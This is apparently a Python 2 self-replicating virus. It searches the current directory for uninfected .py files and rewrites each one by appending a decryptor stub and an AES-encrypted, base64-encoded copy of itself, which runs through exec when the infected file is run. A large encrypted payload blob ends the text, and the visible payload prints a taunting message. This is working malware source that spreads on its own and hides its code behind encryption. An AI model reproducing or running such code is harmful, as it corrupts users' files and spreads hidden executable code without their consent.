def is_infected(filename):
   f = open(filename, 'r')
   lines = f.readlines()
   if len(lines) < 58:
      return False
   print len(lines)
   print lines[len(lines) - 49]
   return lines[len(lines) - 49].startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the original file
   for line in source:
      destination.write(line)

   destination.write("######################################################## First script python\n")
   destination.write("# coding=utf-8\n")
   destination.write("# Start Uncrypted\n")

   copy = False
   result = ''
   for line in this:
      if line.strip() == '# Start Uncrypted':
         copy = True
      elif line.strip() == '# End Uncrypted':
         destination.write('# End Uncrypted')
         copy = False
      elif copy:
         destination.write(line);

   destination.write("\n#Start payload\n")
   destination.write("#")
   destination.write(str(encrypt(e, filename)))
   destination.write("\n#End payload")

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()
 
def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data,filename):
   source = open(filename + '-copy', 'r')
   key = source.readline()

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

def payload():
   print "This file is infected infected! Mhuahauhauahau!"

find_and_infect_files()
payload()######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload